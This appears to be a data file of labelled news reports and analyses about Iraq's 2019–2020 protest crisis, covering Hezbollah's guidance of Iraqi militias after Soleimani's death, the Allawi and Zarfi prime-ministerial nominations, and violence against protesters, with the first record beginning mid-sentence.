struggle with the United States, one of the two Iraqi sources said. Hezbollah’s involvement marks an expansion of its role in the region. The Shi’ite group, founded by Iran’s Revolutionary Guards (IRGC) in 1982, has been at the heart of Iran’s regional strategy for years, helping Soleimani to train paramilitary groups in both Iraq and Syria. One pro-Iran regional official said Hezbollah’s guidance of the militias would continue until the new leadership in the Quds Force – a unit of the Revolutionary Guards led by Soleimani since 1998 – gets a handle on the political crisis in Iraq. The meetings between Hezbollah and Iraqi militia leaders began in January, just days after Soleimani’s assassination, the two Iraqi sources said. Reuters couldn’t confirm the number of meetings or where they took place. One source said they were in Beirut and the other said they were either in Lebanon or Iran. Sheikh Mohammad al-Kawtharani, the Hezbollah representative in Iraq who worked closely with Soleimani for years to guide the Iraqi militias, hosted the meetings, the Iraqi sources said. Kawtharani picked up where Soleimani left off, the Iraqi sources said. The sources said Kawtharani berated the groups, as Soleimani had done in one of his final meetings with them, for failing to come up with a unified plan to contain popular protests against the Baghdad government and the paramilitaries that dominate it. The government and militia groups have killed hundreds of protesters but not managed to contain the rebellion. Kawatharani also urged a united front in picking a new Iraqi prime minister, the Iraqi sources said. Since then, former Iraqi communications minister Mohammed Tawfiq Allawi has been named - a development welcomed by Iran and accepted by the militia-linked parties it backs but opposed by protesters. BIG SHOES TO FILL For now, Kawtharani is seen as the most suitable figure to direct Iraqi militias until a permanent Iranian successor can be chosen, although he possesses nowhere near Soleimani’s clout and charisma, according to the two Iraqi sources and a senior Iraqi Shi’ite leader. “Kawtharani has connections with the militia groups,” the Shi’ite leader said, noting that he was born in Najaf, lived in Iraq for decades and speaks Iraqi dialect. “He was trusted by Soleimani, who used to depend and call on him to help him in crises and in meetings in Baghdad.” One of the Iraqi sources close to the militias said that Kawtharani also met with the Iraqi populist cleric Moqtada al-Sadr, a powerful but unpredictable figure, to convince him to support the new Iraqi prime minister. As Reuters has reported, Sadr has given Allawi his support. Kawtharani will face serious - perhaps insurmountable- challenges in filling the shoes of the leaders killed in the drone attack, the Iraqi sources close to the militias told Reuters. “A lot of faction leaders see themselves as too big and important to take orders from “ one Iraqi source said. “For now, because of pressure from Iran, they’re cooperating with him, but I doubt that will continue and the Iranians know that.” One of the pro-Iran sources, a military commander, said Hezbollah’s involvement would consist of political guidance but stop short of providing manpower and materiel to retaliate for the Solemani killing. The militias “do not need Hezbollah’s intervention because they have the strength in numbers, combat experience and firepower,” the commander said. Those groups are difficult to control while Hezbollah is seen as more disciplined. But like the rest of Iran’s network, Hezbollah risks stretching itself thin, a senior US official in the region and an Iraqi political leader said. In recent years, Hezbollah’s role has grown considerably. It has fought in support of Bashar Assad in Syria. Iranian regime is likely to rely partly on the clout Nasrallah, a figure who commands deep respect among Iran’s allies across the region, the US official said. Nasrallah is seen as overseeing Kawtharani’s efforts, according to a senior Shi’ite Iraqi leader. “I think ideologically, religiously, he’s seen as a charismatic figure to many of the Iraqi Shia militias,” the US official said, requesting anonymity because he was not authorized to speak on the record. In two lengthy televised addresses, Nasrallah has paid homage to Soleimani and vowed to avenge his death. He has also declared it a goal of Hezbollah and its allies to eject US forces from the region once and for all. US forces have been in Iraq since 2014 as part of a coalition fighting against ISIS. If the Iraqi militias have their way, sources close to them say, these troops will be the first to depart. Based on Reuters "
1,"BulgarianMilitary.com - Military and defence news, analysis, research and data PANAGYURISHTE, (BM) – Your briefly report on February 7 in last twelve hours from BulgarianMilitary.com: U.S. kills al Qaeda in Arabian Peninsula leader in Yemen -Trump President Donald Trump said on Thursday the United States had killed Qassim al-Raymi, the leader of Islamist group al Qaeda in the Arabian Peninsula (AQAP), in a counterterrorism operation in Yemen “Under Rimi, AQAP committed unconscionable violence against civilians in Yemen and sought to conduct and inspire numerous attacks against the United States and our forces,” Trump said in a statement. “His death further degrades AQAP and the global al-Qa’ida movement, and it brings us closer to eliminating the threats these groups pose to our national security,” the president said. He did not say when Raymi was killed. The United States regards AQAP as one of the deadliest branches of the al Qaeda network founded by Osama bin Laden. Reports in Yemen have suggested in recent days that Raymi had been killed in a drone strike in Marib. Reuters was unable to verify the reports. One Yemeni government official told Reuters there had been a drone strike in Marib but it was not Raymi who had been killed. Iraq: Al-Sadr supporters shoot fire to disperse Karbala protesters Eyewitnesses stated that the supporters of the Sadrist movement’s leader, Muqtada Al-Sadr, fired live bullets on Thursday to disperse protesters in the city of Karbala in southern Iraq. The eyewitnesses also told Anadolu Agency that dozens of Al-Sadr supporters known as “blue hats” stormed Al-Tarbiyah Square in the middle of Al-Tarbiyah City and attacked the protesters. They added that Al-Sadr supporters carried batons and machine guns, and they fired live bullets in the air to disperse the protesters, amid clashes with them. Many demonstrators fled for fear of killing. The eyewitnesses further stated that Al-Sadr supporters toppled the platform where the protesters used to express their positions for months in Al-Tarbiyah Square. The “blue hats” members have launched an organised campaign, since Monday, to disperse the crowds of protesters in the country’s central and southern cities and towns using excessive force, following the orders of Al-Sadr. Russia: Israeli attack in Syria almost killed civilian airplane The Russian Defense Ministry in Moscow claimed that the Israeli attack on Syria, which killed at least 23 pro-Iranian gunmen in the middle of Wednesday night, put a civilian flight with 172 passengers on board at risk, according to Yediot Aharonot. According to the London-based Syrian Observatory for Human Rights, at least three government Iranian positions near Damascus and west of the capital were targeted. Syria’s official SANA news agency said the Israeli strikes came in two waves and hit the al-Kiswah area as well as Marj al-Sultan and Jisr Baghdad. The first wave at 1:12 a.m. “targeted some of our military positions in the suburbs of Damascus,” SANA quoted a military source as saying. The second wave at 1:41 a.m. “targeted military positions in the surroundings of Dara’a, Quneitra and Damascus countryside with a number of missiles fired by Israeli warplanes from the airspace in southern Lebanon and the occupied Golan.” According to the Russian statement, F-16 jets belonging to the Israeli Air Force (IAF) shot eight air-to-ground missiles without entering Syrian airspace. Moscow blamed Israel for using the civilian aircraft “as a shield against Syrian anti-aircraft systems.” Read more: Russian military specialists killed; Haftar receives Chinese drones; IDF strikes Hamas targets Read more: Military and defense analyzes, comments, opinions and rating – Defweek.com Follow us everywhere and at any time.

1,"BAGHDAD (AP) — Iraqi security forces shot and killed at least one protester in the country's south on Monday, official said as the five-month anti-government protest movement enters a critical stage. Security forces fired live rounds to disperse crowds at the rally site near the al-Ain University in the southern city of Nasiriyah, killing a demonstrator, two medical officials said, speaking on condition of anonymity in line with regulations. The latest death comes as the anti-government protests, which engulfed Baghdad and Iraq's south in October, are at a key point as activists are trying to maintain a critical number of people on the street and tensions continue to escalate between the demonstrators and the followers of a leading radical Iraqi Shiite cleric Muqtada al-Sadr. Nasiriyah has emerged as a frequent flashpoint of protest violence. At least eight protesters were killed in the southern city of Najaf last Wednesday, when followers of al-Sadr stormed the protest site and fired live bullets. Al-Sadr initially threw his weight behind the anti-government uprising but recently re-positioned himself toward the political establishment after political elites selected Mohammed Allawi as prime minister-designate, a candidate he endorsed. Since then, al-Sadr has issued a dizzying array of contradictory calls to followers, asking them to return to the streets, days after withdrawing support from the protests. His conflicting calls have exacerbated existing tensions between anti-government demonstrators and the cleric's followers. Anti-government protesters who took to the streets last October in Baghdad and southern Iraq to decry rampant government corruption, poor services and unemployment, have rejected Allawi’s candidacy. At least 500 have died under fire from security forces in the movement, now in it’s fifth month. On Sunday, Baghdad University students held national flags during a protest in front of the Ministry of Higher Education and Scientific Research in the Iraqi capital.

1,"Iraq's president on Saturday appointed Mohammed Allawi as new prime minister, ending more than two months of political deadlock as parties failed to agree on a candidate. Mr Allawi immediately released a video message on Twitter in which he voiced support for anti-government who forced the resignation of his predecessor and have staged demonstrations since October despite crackdowns that killed hundreds. “Without your courage and sacrifice no change would have happened in the country,"" Mr Allawi said. “I believe in you. Therefore I will be asking you to keep up the demonstrations ... don't go back before you get what you want. Demonstrate, chant, protest. This is your right. This is your country,"" he said. “Our duty is to protect you. The weapons of the state must be employed against those who employ weapons against you.” [ https://players.brightcove.net/5367332862001/6PsTC3MuVq_default/index.html?videoId=6128988863001 ] President Barham Salih's decision to name Mr Allawi as prime minister came as the deadline he set political parties to nominate a candidate was about to expire. Mr Allawi, whose nomination and choice of cabinet must be approved by parliament, said he would resist any attempt by political parties to impose ministerial candidates on him. He said his immediate goals were a new elections law and fresh elections, as well as fixing the economy and restoring the prestige of the state security forces. رسالتي لكم محمد توفيق علاوي pic.twitter.com/WUHxrhSb1g Mr Allawi, a former communications minister, will have one month to form a new government. Former prime minister Adel Abdul Mahdi resigned in November amid mass protests in Baghdad and southern Iraq to demand the removal of the country's political elite. Nearly 500 protesters have been killed. However, protesters rejected Mr Allawi as prime minister when his name was floated as a possible candidate after President Salih issued his three-day deadline to political parties on Wednesday. The protesters, who accuse Iraq's current politicians of corruption and failing to meet their basic needs, want a complete change in the country's leadership and political system, starting with a new election system. An architect by training, Mr Allawi, 66, was born in Baghdad and served as communications minister first in 2006 and again between 2010-2012. He resigned from his post after a dispute with former prime minister Nouri Al Maliki, who presided over the fall of large areas of the country to ISIS in 2014 and is accused of pro-Shiite sectarian policies. Despite his stated willingness to stand up to political pressure, Mr Allawi was reportedly a candidate agreeable to populist cleric Moqtada Al Sadr's Sairoon parliamentary bloc – the largest in parliament – and the rival Fatah coalition led by Hadi Al Amiri, leader of Iraq's Iran-backed militias. Reports circulated online as Mr Allawi's nomination was announced suggested that he had agreed to eject US troops from Iraq, a key demand of both blocs. Parliament passed a resolution calling for the removal of all foreign troops days after the US killed top Iranian general Qassem Suleimani in a drone strike in Baghdad on January 3. Mr Al Amiri's deputy commander in the Hashed Al Shaabi grouping of largely pro-Iran Iraqi militias, Abdul Mahdi Al Muhandis, was also killed in the strike. Suleimani, who oversaw Iran's armed proxies in the region, was seen as a key tool of Iranian influence in Iraq. His assassination came after months of rising tensions between Washington and Tehran over US sanctions targeting Iran's economy and a series of unclaimed attacks in the region targeting the US and its allies. Iraq is caught between the two rivals, needing US economic and military assistance as it seeks to rebuild after the devastation of the war with ISIS and prevent a resurgence by the extremist militants, while at the same time maintaining economic and security ties with its neighbour, with whom many of its current leaders have close ties."
1,"The Iraqi crisis is escalating continuously despite appointing a new head of government, followed by rejecting demonstrations for the mandate. The writer and political analyst, Alaa al-Khatib, talked to Hawar News Agency. ""Appointing a new prime minister will not solve the problem"" ""The demonstrations went out to achieve their goals, and the demonstrators have demands, they cannot stop without fulfilling the wishes of the demonstrators, i.e. the Iraqi street, Iraqis sacrificed to have justice and dignity for hundreds of martyrs and thousands of Wounded and injured. All these sacrifices in order to achieve the goals of the rising youth, and to have a future for the coming generations, not to stop halfway."" ""Once a new prime minister is appointed, the problem is not about a person, it is about a system and a way of governing, the street will not stop unless its demands are met, first of which is to reject quotas and sectarianism and correct the imbalance in the political process, in addition to holding early elections and approving the party law, and a lot of things related to job creation and others."" ""The Iraqi situation is on the brink,"" Al-Khatib said, ""the prime minister in charge will present a new roadmap for the administration of the country. its success depends on the political blocs ceding their demands and privileges, as well as on the cooperation of the demonstrators with Mr. Allawi and giving him strength and support to put pressure on the political forces. to force them to accept change."" He added: ""There is a great chance of success despite the difficult task. S Success depends primarily on treating the problem seriously and stubbornness by any party will lead to an unwelcome end, the situation is serious and it is on the brink."" On the international situation, Alaa al-Khatib said: ""There is international sympathy and regional support for Iraq, noting that the region does not tolerate any more chaos, as a group of countries have declared their support for Iraq, notably the United States, regional countries, China and others."" ""The fate of the Iraqi government is related to acheiving practical and serious solutions on the ground, as it relies on important factors, urgent security and security consolidation through the security agencies taking their natural role in monopolizing violence through the law,"" he said. Differences in democratic countries are normal, but more importantly, the solutions to problems, the establishment of the rule of law and the non-distribution of the sovereignty of the country."" He concluded by saying ""There is a big problem in Iraq which is the distribution of sovereignty and the imbalance in the relationship between the components, a defect in the relationship with Erbil, for example must be corrected, and must correct the Arab-Iraqi, Iranian, Iraqi and American-Iraqi relations.

1,"International and Arab News The top United Nations envoy to Iraq condemned on Monday the use of hunting rifles firing birdshot against peaceful protesters in Baghdad and urged the government to ensure they are not harmed. Iraq faces an extraordinary domestic crisis as nearly 500 people have died in months of protests demanding the ouster of what demonstrators see as a corrupt ruling elite and an end to foreign interference mainly by Iran and the United States. The United Nations Assistance Mission for Iraq said it had received credible allegations of protesters being targeted with hunting rifles, stones and firebombs on the nights of Feb. 14-16, leading to at least 50 injuries. At least 150 people were injured in the city of Karbala in January alone due to similar tactics, UNAMI said in a statement, according to Reuters. “The continued pattern of the use of excessive force, with ambiguously identified armed groups and unclear loyalties, is a grave security concern that must be tackled urgently and decisively. Peaceful protesters should be protected at all times,” said Jeanine Hennis-Plasschaert, Special Representative of the United Nations Secretary-General for Iraq. There was no immediate comment from Iraqi authorities. Prime Minister-designate Mohammed Tawfiq Allawi said on Saturday a new government would be formed in the coming week. Allawi appealed to Iraqis for their support on Saturday hours after his appointment by President Barham Salih, but protesters have already rejected him as a stooge of the political elite.

Photo: Reuters / Thaier al-Sudani. Iraqi authorities on Wednesday reopened one of Baghdad’s major bridges, shut for months by anti-government protesters, in a sign of a lull in unrest that has killed hundreds of people and forced the prime minister to resign last year. The Sinak Bridge, one of the main routes across the Tigris River that bisects the city, leads to a district near the fortified Green Zone of government and diplomatic buildings. It runs parallel to another major bridge, Al Jumhuriya, which connects the Green Zone itself to the main protest camp at Tahrir Square, and which remains shut. “Since early this morning, … with the cooperation of protesters, we were able to re-open the Sinak bridge to let vehicles and residents cross freely,” said Lieutenant General Mohammed al-Bayati, the secretary of the commander-in-chief of the Iraqi armed forces.

At least nine protesters were injured. Nearly 500 people have been killed in demonstrations which have raged since October, demanding the removal of what protesters see as a corrupt ruling elite and an end to foreign interference — mainly by Iran and the United States. The Baghdad military operations office called on remaining protesters to stay at their main protest camp in Tahrir square, state TV reported. “The reopening of the bridge makes me happy,” a driver on the newly-reopened bridge told Reuters TV. “The government should work to satisfy citizens. We don’t want anything else. We want life to come back to normal.” In separate violence, at least 12 security personnel and 11 protesters were injured in the southern Iraqi province of Nassiriya, medical and security sources said, after clashes broke out in the afternoon.

The youngest victim was a 13-year-old child, the source added.Iraq remains mired in turmoil, with protesters calling for sweeping changes and a decisive end to the current system, imposed after the 2003 US occupation of the country, which marked the inception of a ruling system shaped by sectarian and religious division.

1,"Select Page Posted by Iraqi Thoughts | Mar 2, 2020 | Economy, Featured, Politics, Society | 0 Iraq has been facing a series of crises for the last several months. Due to the leadership vacuum it has been plagued with since Adil Abd Al-Mahdi assumed office in October 2018, this is likely to worsen on several scales and culminate into a perfect storm that will drive the country to the brink. Social Crisis The youth protests that started on 1 October 2019 and engulfed Baghdad and Iraq’s nine southern provinces started for several reasons. They boil down to a clash between the “haves” and the “have-nots”. Picture the convoys of armoured SUVs ferrying politicians and officials versus the now infamous tuk-tuks, the method of transportation for those who cannot afford a taxi, let alone their own vehicle. The social upheaval has paralysed several cities, prevented tens of thousands of Iraqi children from attending school and led to the resignation of the government. Despite the promises of reform, the draft pieces of legislation sitting on the desks of parliamentarians and the continuous hiring of Iraqi public sector employees, the protests have not declined. The youth are crying out that they “want a homeland” which seems odd unless you interpret it to mean “hope”. This is sorely missing from average Iraqis, whether young or old due to the lack of vision provided by Abd Al-Mahdi and his lacklustre cabinet. Political Crisis The social upheaval led Iraq’s Grand Ayatollah Ali Al-Sistani to give a sermon (through a representative) on 29 November 2019 calling on the Government of Iraq to resign. The same day, Abd Al-Mahdi wrote to the Iraqi Council of Representatives informing them that he is resigning. Abd Al-Mahdi also asked his cabinet to discharge their duties until replacement ministers take over their portfolios. Due to political wrangling and then the killing of Qods Force Commander Major General Qassim Soleimani and Public Mobilization Forces (PMF) Deputy Abu Mahdi Al-Muhandis, in an American airstrike just outside Baghdad International Airport, the process to replace Abd Al-Mahdi was severely delayed. An agreement was made between the leaders of the Fateh and Sairoon Alliances. Hadi Al-Ameri and Muqtada Al-Sadr would push the candidacy of Mohammed Tawfik Allawi as a new face to the existing political equation which emerged as a result of the 2018 election which made the two men kingmakers. On 1 February 2020 President Barham Salih nominated Allawi to form a new government within thirty days. Allawi was given mission impossible: appease the protestors trying to bring the political system down and also woo the parliamentarians that make up the system so they vote for him, his government programme and his cabinet. After a month of preparation and horse-trading, Allawi went to parliament on 27 February only to be shunned by a majority of parliamentarians who boycotted the parliamentary session in order to avoid a vote on his candidacy. On 1 March Allawi went to parliament again and once again the majority of MPs boycotted the session. Later that night, Allawi withdrew his nomination. While Iraq’s politicians are back to square one, resigned Prime Minister Abd Al-Mahdi confirmed his stance that it is wrong that he remains as acting prime minister after resigning in November. With the acting prime minister shirking responsibility and no replacement in sight, Iraq could be a ship without a captain in the coming days. While Iraq has a president, his ceremonial position is not to head the executive branch of government. Also, Salih will now be preoccupied with replacing Allawi as the constitution provides him the ability to choose a candidate without reverting back to the largest bloc in parliament. All eyes will be on Salih as the success or failure of the new candidate will be on his shoulders in the same way that Allawi’s failure is on the shoulders of Sadr and Ameri. Economic Crisis As we enter the third month of 2020, Iraq has yet to pass the federal budget law for this financial year. This means that the Government of Iraq can only cover operational expenses such as salaries as it does not have the legal basis to spend on investment projects. With the government being the biggest player in Iraq’s economy, rather than the private sector, we could see an economic slowdown in the coming months, if not weeks. With oil revenues making up nearly ninety percent of Iraq’s budget, the recent decline in oil prices are concerning, to say the least. This last week Brent Crude traded below $50. Iraq’s oil revenues are based on the cost of Brent Crude minus the cost of extraction, which varies from oilfield to oilfield and also the quality of the oil. Thus Iraq makes $3-7 below Brent Crude. This means that Iraq is making $42-46 per barrel of oil. At production rates of 4.16 million barrels per day, Iraq will earn $5.2 billion to $5.7 billion per month which is barely enough to cover the costs of the salaries of the public sector employees. If the price of oil continues to fall, as is expected due to the coronavirus epidemic, then the government will only be able to meet its commitment to public sector employees but not finance its debts or meet other financial obligations. The Perfect Storm The continued protests, coupled with the lack of leadership and the looming economic crisis make for a perfect storm in Iraq as it approaches the searing heat of its summers. The political elite need to think about the next four to six months and work towards solutions to the above-mentioned problems. Otherwise they could see themselves as the former political elite of the country as Iraq descends into further instability and greater chaos.

Frantzman Who is Adnan al-Zarfi (Zurufi عدنان الزرفي), the man tasked with forming yet another Iraqi government on March 17 by President Barham Salih. after almost six months of uncertainty, protests and increasing US-Iran tensions in Iraq, he has a major job ahead of himself. He will have a huge task ahead of him to try to build a coalition, deal with the rising anti-US rocket attacks by Iranian-backed groups, rebuild Sunni areas, fight an ISIS insurgency, come to a budget agreement with the autonomous Kurdish region and manage parliamentary demands for US withdrawal. Recent events He has been active in Najaf for many years. Accused of ""irresponsible statements"" in a legal dispute last year as a member of parliament. In the fall of 2019 his name was already put forward as a possible replacement for Adel Abdul Mahdi. An MP said that there was a ""meeting where it was discussed the challenges of getting out of the [protest] crisis, pointing to the existence of alternative names put forward in the meeting, in the event of Abdul Mahdi’s resignation, as the governor of Basra, Asaad al-Aydani, MP Adnan al-Zarfi, and former Minister of Labor and Social Affairs, Mohammed Shiaa al-Sudani."" During the protests he was outspoken several times. In December when parliament failed to convene on Sunday for the fourth consecutive day after Prime Minister Adel Abdul Mahdi failed to attend. One reports notes ""Nasr Coalition deputy Adnan Zarfi warned political leaders against losing their “last chance” and said authorities must not commit their previous mistakes, rather they must listen to the demands of the youth."" In February 2019 Muqtada al-Sadr and Hadi al-Amiri were campaigning in favor of a vote to end American military presence in the country. Kurdistan 24 noted ""However, Zarfi, pointing to the 'worrying' security situation in Iraq, warned the legislature against “rushing” to pass such a law, but reassured that it would be 'difficult' to do so."" In the spring of 2018, as Najaf governor, Zarfi sought to reconcile Haider Abadi and Ali Sistani. He was pushed out as Najaf governor in 2015. He was an active parliamentarian from Najaf since then. His appointment is argued by some to be supported by Muqtada al-Sadr, factions within the Fatah Alliance, Haider al-Abadi and even Hikma. He may have faced opposition from Nouri al-Maliki, some elements of Badr and Asaib Ahl al-Haq. Others say that the opposite is true, that he faces opposition from Hikma's Ashura militia. They note ""those reject to the commission of Adnan Al-Zorfi [sic]: The Sadr movement is the owner of the Saraya Salam Brigades militia, the Al-Fatih block [Fatah Alliance], the Badr militia. Hikmat Bloc and its Ashura militia. Sadikon bloc with the Asaib Ahl Al-Haq militia."" It is thought he will have the same hurdles as Mohammed Tawfiq Allawi. Active in reconstruction after 2003 He was outspoken after the US-led invasion in 2003. A Wall Street Journal piece mentioned him:""The governor of this holy city wanted a 51-year-old Texan named Brent Blaschke to improve the deteriorating security on the main road. 'People believe you can do a lot more,' said the governor, Adnan al-Zarfi."" He was seen as independent in reports. He was also involved in mediating the 2004 clashes with Muqtada al-Sadr. At the time The Guardian noted ""The attack on the vast cemetery near the Imam Ali mosque, Najaf's holiest site, followed a night of intermittent gunfire. Adnan al-Zarfi, the governor of Najaf, yesterday gave US forces approval to enter the mosque complex, which the US claims is being used by Mr Sadr's loyalists as a launchpad for attacks."" Zarfi (often known as Zurufi in some documents in English) is mentioned in US diplomatic cables. In one cable in 2004 the US met with him and other members of Najaf's political establishment, including ""Talal Bilal, the Governor's aide and close friend"" and Dawa party member Provincial Council Chair Shayk Fa'ad. At this time Muqtada al Sadr had signed an agreement after the intervention of Ali Sistani into Najaf's crises. ""They further feel that the agreement al-Sadr signed has strengthened the Iraqi Government's ability to move against al-Sadr if the Mahdi Militia takes up arms once again."" Assessments at the time in Najaf indicated to theUS that Jaysh al Mahdi would ""splinter"" between ""extremists"" such as Qais Khazali (eventually founder of Asaib Ahl al-Haq) and others who might join the Dawa party. ""Fa'ad speculated that some elements of the Jaysh al-Mahdi might be absorbed into the Supreme Council for Islamic Revolution in Iraq (SCIRI)."" The cable notes there ""was a schism in the party [SCIRI], and within its Badr Corps, over how closely the party should remain aligned to Iran....Other members, including Badr Corps commanders such as Mahdi Muhandis, wanted to have closer ties with Iran. Fa'ad alleged that individuals like Muhandis had made early overtures to the Jaysh al-Mahdi movement and may now look to absorb these erstwhile allies, and by extension the resources of their Iranian backers, into SCIRI."" The US killed Muhandis andIRGC commander Qasem Soleimani on January 3, 2020. ""All three men [including Zarfi] agree that al-Sadr is finished politically. ""Governor Zurufi shares Talal's assessment that al-Sadr is finished politically. The Governor also agrees that if al-Sadr violates the points of the proposal that the government will be on much firmer ground to move against him."" Zarfi sought funds for Najaf. He pushed for an oil investment project in 2010. ""Najaf Governor Adnan al-Zarfi told Aswat al-Iraq news agency. The project is expected to produce 400,000 barrels of oil per day and will provide the province with $400 million a year, he added."" He wanted more investment in agriculture in 2011. ""Najaf governor announced the availability of great water storage in Najaf desert enough for 25 years, stressing granting licenses to cultivate 70.000 dunams in the desert area that will depend on underground waters. Governor Adnan al-Zarfi told Aswat al-Iraq that the province made an agricultural plan to depend on underground waters, instead of the Euphrates River."" He pushed for more school the same year. ""Najaf Governor Adnan al-Zarfi as criticizing the Education Ministry for the delay in constructing new schools in the governorate,"" In 2013 he pushed for a new airport ""Najaf Governor Adnal Al-Zarfi disclosed that there are plans to increase the space of Najaf city by new housing complexes as well as industrial and agricultural projects."" When the US left Iraq in 2011 he made comments to The New York Times. The article is quoted in part below: ""'Before 2003, 90 percent of Najaf people liked Iranians,' said the governor, Adnan al-Zurufi, who has lived in Chicago and Michigan and holds American citizenship. 'Now, 90 percent hate them. Iran likes to take, not give.' Near midnight, Mr. Zurufi held court at a cafe, his team of bodyguards standing sentry at the door, frisking patrons. Outside, a convoy of white sport utility vehicles waited, and nearby, down a crooked alleyway, thousands of visitors took in the nighttime serenity of the Imam Ali Shrine, one of the holiest sites for the Shiite diaspora, where millions of Iranians flock every year. Mr. Zurufi's comments cut against the grain of what is commonly understood about the influence of Iran in southern Iraq, where the two countries have a common religious bond - both are majority Shiite - but where nationality competes with sect."" - October 8, 2011 The article noted that he was appointed in 2004 by L.Paul Bremer III, then the top American administrator in Iraq, elected to the same job in 2009 and that he was pro-American. ""Not only did the Americans refuse a request by Mr. Zarfi and other officials to open a consulate in Najaf, the State Department's Provincial Reconstruction Team in Najaf actually shut down earlier than scheduled this summer after local clerical pressure, particularly from officials loyal to Mr. Sadr, who spends most of his time in Iran."" Social media We analyzed Arabic tweets about him, including here and here and there is video of him meeting Iraq's President. A photo of an alleged US passport he has was also put up. Protesters have said he will fail. He has been accused of being close to the US, Qatar and having mismanaged Najaf. ""He failed to manage a province, how can he manage the country,"" one twitter user asks. These critics also see him as linked to US Secretary of State Mike Pompeo and close to the US. Photos allegedly show him with US soldiers. Other critics accused him of corruption in schemes at Najaf airport and of harming protesters in the city. A note by protesters was also posted saying they vow to topple him. A decree appointing him was put online and video shows him with the press. Reports online about his appointment can be found at Rudaw and Al-Mayadeen. According to these reports Monday, Sadr's Sairoon called on Iraqi President Barham Salih (برهم صالح) to name the new prime minister after the major blocs failed to reach a compromise candidate. There had been rumors that Naim Al-Suhail would be tapped. Pressure was rising also from Khazali and others US Department of Defense assessment A lengthy report about his appointment from 2004. We have added it in full: A former prisoner of the Saddam Hussein regime who returned to Iraq from exile last year has been appointed as the new governor of Najaf province, coalition administrator Ambassador L. Paul Bremer III announced today in Baghdad. Emphasizing that Iraqi authorities and the coalition are cooperating to reaffirm the rule of law and to restore order to the middle Euphrates area, Bremer said Adnan al- Zurufi's appointment will enhance that cooperation. Bremer said he appointed Zurufi as Najaf's governor now because the difficulties and sufferings of the people of the middle Euphrates region can't wait for the turnover of sovereignty on June 30 and national elections in January. ""He is the right man for the job at this time,"" Bremer said. ""A sports hero as a youth, Governor Zurufi showed his love of justice as the head of an anti-Saddam student organization. This led to his imprisonment and escape from Saddam's jails. He participated in the 1991 Iraq intifada, and was eventually forced into exile. He returned to Najaf in April last year."" Zurufi, a member of the Bani Hassan tribe, earned a degree in Islamic law at Alfik College, the Islamic jurisprudence college, in Najaf. ""Governor Zurufi's attachment to Najaf and his proven willingness to fight for justice will serve the people well as he administers the government,"" Bremer pointed out. Radical cleric Muqtada al-Sadr is believed to be in the city of Najaf, and has continued to incite his followers to violence. Iraqi authorities have issued an arrest warrant for Sadr in connection with the murder of a prominent Shiia cleric. ""The contrast between Governor Zurufi's love of justice and the behavior of another individual in the middle Euphrates could not be more stark,"" Bremer said. ""Over the past few months, one man and armed elements under his control have spread lawlessness, fear and economic paralysis, especially in Najaf and Karbala."" - By Rudi Williams, American Forces Press Service, WASHINGTON, May 6, 2004. Other sources He is remembered as a former team member of the Iraq Reconstruction and Development Council (IRDC), a US Department of Defense supported group. This led to his appointment in 2004 and later his work with the government during the Sadr crises in 2004. He was a target of some IED and other attacks between 2004 and 2006. Wikipedia cays he is a member of the Bani Hassan tribe and has a degree from Alfik College. The latter is taken from the DoD statement in 2004.

The CVs are taken from the official page of Al Wafa Movement. Opposition to his appointment A report posted online notes why he should be opposed: ""The nomination of any person accused of corruption for any important position as a betrayal of the size of the position to which he is nominated, and whoever nominates corrupt or endorses a corrupt nomination, or is silent about the nomination of a corrupt is a partner in corruption, and encourages him knowingly and previously insistently, as he is responsible for the results. 1 - Mr. Adnan Al-Zarfi had previously held the position of Governor of Najaf for several years, ending in his conviction for corruption, and dismissing him from his position fundamentally and a decision to dismiss him from the Presidency of the Republic was issued by Republic Decree No. 64 of September 17, 2015, signed by former President Fouad Masum. And who is dismissed because he is not fit for a conservative position, how can he be assigned to the highest position in the state? 2 - Iraq is going through a critical stage represented in the struggle to preserve its independence and sovereignty in front of foreign forces that violate its sovereignty over its airspace and exercise combat operations without the permission of its government and bomb Iraqi government forces without the approval of the executive authority, and kill Iraqi citizens, thereby attacking the powers of the judicial authority The exclusive right to investigation, conviction, punishment, and execution for any violation committed by an Iraqi citizen. There is no doubt that the prime minister’s first mission in these circumstances is to preserve Iraqi sovereignty from any force that violates it, hold it accountable and take the necessary measures to preserve the sovereignty of Iraq, and this does not come with the nomination of a person closely related to the entity that violates the sovereignty of the Iraqi state and kills its citizens in cold blood. 3 - While the Iraqi people take pride in the heroic fighters of the popular crowd [PMU] who liberated Iraq from ISIS and made in this way the most precious sacrifices, nominating those who sympathize with the forces attacking the popular crowd means confronting the outrage of the overwhelming majority of Iraqis who are jealous of the popular crowd and who appreciate their sacrifices, Which shocks the hopes of the majority of honest Iraqis ... and makes the new prime minister in front of two ways that have no third: satisfying the loyal masses of those who liberated the homeland from ISIS, or satisfying the foreigner who declares his war against those who liberated the homeland from ISIS. 4 - The name of Adnan Al-Zarfi was mentioned among those involved in the recent events of Najaf, including the burning of public and private property, attacks and armed violence that led to the loss of life, making his commission before the results of the investigation of these events appear an irresponsible act that denotes the disregard for the civil rights of the people of Najaf and disregards the blood of its citizens. 5 - In all cases, Adnan Al-Zarfi is a figure that is not suitable for this sensitive position in this sensitive circumstance. Whoever is not fit for a conservative administration is not suitable for state administration, and whoever is not entrusted with a conservative treasury does not trust a state treasury, and it is sufficient for the President of the Republic to review a chapter file Al-Zarfi is from the position of the governor of Najaf to brief himself on the reasons for his dismissal, and the reasons for it, which clearly indicate his non-suitability for any public office or serious responsibility."" © 2023 by MECRA Proudly created with Wix.com © 2018 All rights reserved."

The Iraqi revolution is a societal uprising involving a wide spectrum of society including the dispossessed, the marginalized, the ones deprived of resources and power. Women's massive participation from young female students to older women has turned this uprising to a people's revolution.

1,"Protesters in Iraq, coming up on half a year of demonstrating against the corruption and incompetence of their government, were not reassured by Baghdad’s handling of the coronavirus. Furious that their disorganized and thoroughly looted government lacks the money and human resources to mount an effective defense, the protesters are setting up their own screening and treatment facilities, distributing information on how to prevent the spread of the disease, and giving out medical masks. “The real virus is Iraqi politicians. We are immune to almost everything else,” grumbled a protester named Fatima to the AFP news service on Tuesday. “Political parties and corruption are an epidemic that is much more dangerous than the coronavirus. This is the outbreak we want to get rid of because it has destroyed Iraq,” agreed another protester named Mohammad. “Even in normal times our health care system is totally run down. Now, on top of everything, we have a coronavirus outbreak, and we are supposed to rely on these facilities?” said Fatima, an 18-year-old medical student who was doing volunteer work at one of the protesters’ clinics in Tahrir Square, the heart of the protest movement in Baghdad. AFP grimly noted that the improvised clinics were originally put together to treat gunshot wounds and tear gas exposure. A group of protesters made that history explicit by chanting at security troopers, “Your snipers didn’t deter us, what can the 